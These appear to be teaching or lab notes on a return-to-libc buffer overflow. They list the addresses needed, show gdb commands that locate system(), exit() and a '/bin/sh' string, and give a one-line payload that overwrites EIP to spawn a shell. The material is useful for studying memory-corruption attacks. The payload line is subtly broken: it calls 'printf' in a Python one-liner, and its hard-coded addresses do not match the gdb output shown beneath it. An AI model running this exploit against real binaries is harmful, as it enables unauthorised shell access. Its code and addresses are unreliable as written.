- You need a buffer big enough to overflow
- you need the address of system as seen by the binary
- you need the address of exit() as seen by the binary
- you need a memory address pointing to the string /bin/sh

(gdb) find &system, +9999999, "/bin/sh" 

Putting it all together

– We need to overwrite EIP with the system call
– Right after EIP we need the memory location of exit() so the system() 
call will properly exit.
– Followed by the location of our string in memory
– Then junk data

• python -c 'printf "A" * 24 + 
"\x10\xef\xe9\xb7\x50\x25\xe9\xb7\x21\xf8\xff\xbf" + "C" * 92' > badfile




(gdb) p system
$1 = {<text variable, no debug info>} 0xb7ec66b0 <system>
(gdb) p exit
$2 = {<text variable, no debug info>} 0xb7eb9f80 <exit>

(gdb) find &system, +99999999, "/bin/sh"
0xb7fb5474